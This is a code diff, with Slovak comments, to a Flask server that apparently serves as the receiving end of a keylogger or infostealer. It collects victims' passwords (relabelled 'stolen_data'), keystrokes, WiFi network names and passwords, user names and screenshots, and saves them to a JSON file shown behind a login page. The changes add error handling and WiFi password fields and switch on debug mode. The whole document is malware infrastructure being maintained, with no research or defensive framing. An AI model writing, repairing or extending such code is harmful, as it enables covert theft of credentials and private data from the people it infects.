@@ -13,12 +13,18 @@ DATA_FILE = "data.json"
 def load_data():
     if not os.path.exists(DATA_FILE):
         return []
-    with open(DATA_FILE, "r", encoding="utf-8") as f:
-        return json.load(f)
+    try:
+        with open(DATA_FILE, "r", encoding="utf-8") as f:
+            return json.load(f)
+    except:
+        return []
 
 def save_data(data):
-    with open(DATA_FILE, "w", encoding="utf-8") as f:
-        json.dump(data, f, indent=2, ensure_ascii=False)
+    try:
+        with open(DATA_FILE, "w", encoding="utf-8") as f:
+            json.dump(data, f, indent=2, ensure_ascii=False)
+    except Exception as e:
+        print(f"Chyba pri ukladaní: {e}")
 
 def login_required(f):
     @wraps(f)
@@ -38,26 +44,27 @@ def submit_data():
         # Pridáme čas prijatia
         data['received_at'] = datetime.utcnow().isoformat() + "Z"
 
-        # Kompatibilita s klientom - server očakáva 'stolen_data'
+        # Kompatibilita s klientom
         if 'passwords' in data:
-            data['stolen_data'] = data.pop('passwords')  # Premenovanie
+            data['stolen_data'] = data.pop('passwords')
         elif 'stolen_data' not in data:
             data['stolen_data'] = []
 
-        # WiFi kompatibilita
         if 'ssid' in data:
             data['wifi_ssid'] = data.pop('ssid')
+        if 'wifi_password' not in data:
+            data['wifi_password'] = None
 
         # Uložíme dáta
         current_data = load_data()
         current_data.append(data)
         save_data(current_data)
         
-        print(f"✅ Dáta prijaté od {data.get('user', 'Unknown')}: {len(data.get('keys', []))} klávesov, {len(data.get('stolen_data', []))} hesiel")
+        print(f"✅ Dáta prijaté: {data.get('user', 'Unknown')} | WiFi: {data.get('wifi_ssid')} | Hesiel: {len(data.get('stolen_data', []))}")
         return jsonify({"status": "ok"}), 200
         
     except Exception as e:
-        print(f"❌ Server chyba: {e}")
+        print(f"❌ Server chyba /submit: {e}")
         return jsonify({"error": str(e)}), 500
 
 @app.route('/login', methods=['GET', 'POST'])
@@ -104,8 +111,11 @@ def screenshot(index):
     b64 = entry.get('screenshot')
     if not b64:
         return "No screenshot", 404
-    img_bytes = base64.b64decode(b64)
-    return send_file(BytesIO(img_bytes), mimetype='image/png', download_name=f"screenshot_{index}.png")
+    try:
+        img_bytes = base64.b64decode(b64)
+        return send_file(BytesIO(img_bytes), mimetype='image/png', download_name=f"screenshot_{index}.png")
+    except:
+        return "Invalid screenshot", 404
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=True)
